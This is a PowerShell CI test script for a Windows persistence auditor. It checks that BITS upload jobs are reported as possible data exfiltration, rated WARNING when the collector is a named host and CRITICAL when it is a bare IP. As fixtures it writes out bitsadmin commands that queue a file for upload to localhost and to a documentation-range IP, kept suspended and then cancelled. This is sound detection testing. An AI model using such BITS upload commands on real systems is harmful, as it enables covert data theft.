# CI ONLY -- run by .github/workflows/windows-smoke.yml on a throwaway runner,
# from the step named:
#   persistence_extra.ps1 BITS upload direction (both directions)
# It may plant test state on the machine it runs on; do not run it on a
# machine you use. It lives in .github/ so it never reaches a USB stick
# (make_usb_stick.ps1 excludes the directory), and outside the workflow file
# because GitHub refuses to run a workflow file over its size limit --
# silently: the jobs simply never appear. The body below is the step's own,
# moved unchanged.
$ErrorActionPreference = 'Stop'
# A BITS job whose TransferType is Upload sends a local file OUT. That
# direction had never been read at all: TransferType was not an input
# to the rule, so an upload job's local source (the data leaving) was
# examined only for autostart writes and its collector was printed as
# "an ordinary destination". Both plants below are created with
# `bitsadmin /create`, which leaves the job SUSPENDED, and are never
# resumed -- nothing leaves this runner, and no receiving server
# (which an upload would need: Microsoft documents the IIS BITS
# Server Extension as the thing that accepts one) is involved.
#
# Touches: bits-job:dz_selftest_bits_upload, bits-job:dz_selftest_bits_upload_ip,
#          file:%TEMP%\dz_ci_bits_payload.bin  -- all removed in finally.
$up   = 'dz_selftest_bits_upload'
$upIp = 'dz_selftest_bits_upload_ip'
$dl   = 'dz_selftest_bits_dlonly'
$payload = Join-Path $env:TEMP 'dz_ci_bits_payload.bin'
foreach ($j in @($up, $upIp, $dl)) { & bitsadmin /cancel $j 2>&1 | Out-Null }
try {
  Set-Content -LiteralPath $payload -Value 'dz_selftest upload payload' -Encoding ASCII

  # (a) A DOWNLOAD plant alone must write no upload marker and print
  # no upload line. Without this the step could pass by always
  # finding what it looks for.
  $mkDl = (& bitsadmin /create $dl 2>&1) -join ' '
  & bitsadmin /addfile $dl 'http://localhost/dz_ci_nonexistent' "$env:TEMP\dz_ci_bits_dlonly.bin" 2>&1 | Out-Null
  # The control has to be VERIFIED, not assumed: this step's (a)
  # assertion is a NEGATIVE one, so a plant that silently failed
  # would make it pass having proved nothing -- loud for the plants
  # whose absence fails a positive assertion, silent for the one
  # whose absence makes a negative assertion vacuous is backwards.
  $dlJob = @()
  try { $dlJob = @(Get-BitsTransfer -AllUsers -EA Stop | Where-Object { $_.DisplayName -eq $dl }) }
  catch { $dlJob = @(Get-BitsTransfer -EA SilentlyContinue | Where-Object { $_.DisplayName -eq $dl }) }
  if ($dlJob.Count -lt 1) { throw ("the download control plant did not take; bitsadmin said: " + $mkDl) }
  if ($dlJob[0].PSObject.Properties.Name -contains 'TransferType') {
    if ([string]$dlJob[0].TransferType -notmatch '(?i)^download$') {
      throw ("the download control plant is not a download ({0}) -- the control proves nothing" -f $dlJob[0].TransferType)
    }
  }
  $mdA = Join-Path $env:TEMP ("dz_pe_up_a_{0}" -f $PID)
  $outA = (.\tools\persistence_extra.ps1 -MarkerDir $mdA -BitsAgeDays 0) -join "`n"
  if ($outA -match 'queued to UPLOAD') {
    Write-Host (($outA -split "`n" | Where-Object { $_ -match 'BITS job' }) -join "`n")
    throw 'a download-only job produced an upload finding -- the direction is not being read'
  }
  if (Test-Path (Join-Path $mdA 'dz_bitsupload.txt')) {
    throw 'a download-only job wrote the upload marker -- every machine would raise the T1048 row'
  }

  # (b) The real thing: an upload to a NAMED host. WARNING, with the
  # file and the collector named, and the sentence that says what
  # tells a management agent from an intrusion. Never CRITICAL: a
  # ConfigMgr management point receives client uploads this way.
  & bitsadmin /create /upload $up 2>&1 | Out-Null
  $addUp = (& bitsadmin /addfile $up 'http://localhost/dz_ci_upload.bin' $payload 2>&1) -join ' '
  # (c) ...and the malign twin beside it: the same shape, but the
  # collector is a bare public IP with no name behind it. 198.51.100.0/24
  # is TEST-NET-2, reserved for documentation and never routed, so the
  # suspended job cannot reach anything real.
  & bitsadmin /create /upload $upIp 2>&1 | Out-Null
  & bitsadmin /addfile $upIp 'http://198.51.100.7/dz_ci_upload.bin' $payload 2>&1 | Out-Null

  # A plant that did not take is declared, never silently skipped.
  $jobs = @()
  try { $jobs = @(Get-BitsTransfer -AllUsers -EA Stop) } catch { $jobs = @(Get-BitsTransfer -EA Stop) }
  $planted = @($jobs | Where-Object { $_.DisplayName -eq $up -or $_.DisplayName -eq $upIp })
  if ($planted.Count -lt 2) {
    throw ("the upload plants did not take ({0} of 2 visible to Get-BitsTransfer); bitsadmin said: {1}" -f $planted.Count, $addUp)
  }
  # MEASURED, not argued: which properties Windows PowerShell 5.1
  # really exposes on a BitsJob. The whole rule rests on TransferType
  # being readable here; if it is not, the tool's declared gap is what
  # ships and this step says so instead of pretending otherwise.
  Write-Host '--- measured: BitsJob properties on this engine ---'
  Write-Host (($planted[0].PSObject.Properties.Name | Sort-Object) -join ', ')
  Write-Host (($planted | Select-Object DisplayName, TransferType, JobState, OwnerAccount | Format-List | Out-String))
  $hasType = ($planted[0].PSObject.Properties.Name -contains 'TransferType')

  $mdB = Join-Path $env:TEMP ("dz_pe_up_b_{0}" -f $PID)
  $outB = (.\tools\persistence_extra.ps1 -MarkerDir $mdB -BitsAgeDays 0) -join "`n"
  Write-Host (($outB -split "`n" | Where-Object { $_ -match 'BITS job|file:|to:|why:|note:|state:' }) -join "`n")

  if (-not $hasType) {
    Write-Host '[ SKIP ] this engine does not expose TransferType on a BitsJob, so the upload rule cannot run here; asserting the DECLARED GAP instead'
    if ($outB -notmatch 'did not report a readable transfer direction and were NOT checked for it') {
      throw 'TransferType is unreadable and the report did not declare that gap -- an unread direction would be absorbed as a download'
    }
  } else {
    if ($outB -notmatch "\[WARNING\] BITS job '$up' \(owner [^)]*\) is queued to UPLOAD a file off this machine \(T1048\):") {
      throw 'the upload job to a named collector was not reported as a WARNING naming the direction'
    }
    if ($outB -match "\[CRITICAL\] BITS job '$up'") {
      throw 'an upload to a NAMED collector was graded CRITICAL -- a ConfigMgr management point is the ordinary cause of that shape'
    }
    if ($outB -notmatch 'dz_ci_bits_payload\.bin') {
      throw 'the upload finding did not name the file that would leave the machine'
    }
    if ($outB -notmatch 'localhost/dz_ci_upload\.bin') {
      throw 'the upload finding did not name the collector'
    }
    if ($outB -notmatch 'management agent may upload diagnostics') {
      throw 'the upload finding did not say what tells a management agent from an intrusion'
    }
    if ($outB -notmatch "\[CRITICAL\] BITS job '$upIp' \(owner [^)]*\) is queued to UPLOAD a file off this machine \(T1048\):") {
      throw 'an upload to a BARE PUBLIC IP was not CRITICAL -- the twin that proves the judgement, not just the mechanism'
    }
    if ($outB -notmatch 'bare public IP address with no name') {
      throw 'the CRITICAL upload did not say why it is critical'
    }
    $m = Join-Path $mdB 'dz_bitsupload.txt'
    if (-not (Test-Path $m)) { throw 'the upload finding wrote no marker -- it never reaches the ledger' }
    # A direction that WAS read must not also be declared as a gap,
    # and the gap marker is a different row (T1048, not T1197).
    if (Test-Path (Join-Path $mdB 'dz_bitsupload_gap.txt')) {
      throw 'the direction was read and the gap marker was written anyway -- the T1048 gap row would fire on every machine'
    }
    if ((Get-Content -LiteralPath $m -Raw).Trim() -ne 'CRITICAL') {
      throw ("the upload marker should carry the highest severity printed (CRITICAL), not: " + (Get-Content -LiteralPath $m -Raw))
    }
    # The T1197 row must not absorb it: a plain upload job has no
    # notify command line and no questionable download destination.
    if ($outB -match "\[(WARNING|CRITICAL)\] BITS job '$up'[^\r\n]*notify command line") {
      throw 'the upload job was also reported as a notify-command finding -- two rows for one observation'
    }
  }

  # MEASUREMENT ONLY, asserted nowhere: what Windows itself recorded
  # about these jobs. Third-party sources disagree on whether the
  # Bits-Client/Operational events carry the URL and on what Event 59
  # even means, so this prints the records and a later change can read
  # them on evidence rather than on blog posts.
  Write-Host '--- measured: Microsoft-Windows-Bits-Client/Operational for the plants ---'
  try {
    $ev = @(Get-WinEvent -LogName 'Microsoft-Windows-Bits-Client/Operational' -MaxEvents 60 -EA Stop)
    $mine = @($ev | Where-Object { $_.Message -and ($_.Message -match 'dz_selftest_bits_upload|dz_ci_upload\.bin|dz_ci_bits_payload') })
    Write-Host ("records in log: {0}; records naming a plant: {1}" -f $ev.Count, $mine.Count)
    foreach ($e in @($mine | Select-Object -First 8)) {
      Write-Host ("  Id={0} {1:yyyy-MM-dd HH:mm:ss} {2}" -f $e.Id, $e.TimeCreated, (($e.Message -split "`r?`n")[0]))
    }
    if ($mine.Count -eq 0 -and $ev.Count -gt 0) {
      Write-Host '  (no record names a plant: creating and cancelling a suspended job may leave nothing in this log)'
    }
  } catch {
    Write-Host ("  the Bits-Client operational log could not be read here: " + $_.Exception.Message)
  }
  Remove-Item $mdA, $mdB -Recurse -Force -EA SilentlyContinue
} finally {
  foreach ($j in @($up, $upIp, $dl)) { & bitsadmin /cancel $j 2>&1 | Out-Null }
  Remove-Item $payload -Force -EA SilentlyContinue
  Remove-Item "$env:TEMP\dz_ci_bits_dlonly.bin" -Force -EA SilentlyContinue
  $left = @()
  try { $left = @(Get-BitsTransfer -AllUsers -EA SilentlyContinue | Where-Object { $_.DisplayName -like 'dz_selftest_bits_upload*' }) } catch {}
  if ($left.Count) {
    # Not a warning: these two names carry no dz_selftest marker in a
    # field the audit excludes, so a leaked suspended upload job
    # would be reported as a T1048 finding by the next audit on this
    # machine -- the "do not report our own test harness as an
    # intrusion" class.
    throw ("{0} planted upload job(s) survived cleanup: {1}" -f $left.Count, (($left | ForEach-Object { $_.DisplayName }) -join ', '))
  }
}
Write-Host 'BITS upload OK (a download plant writes no upload finding; a named collector is WARNING with the agent cause named; a bare public IP is CRITICAL)'
exit 0
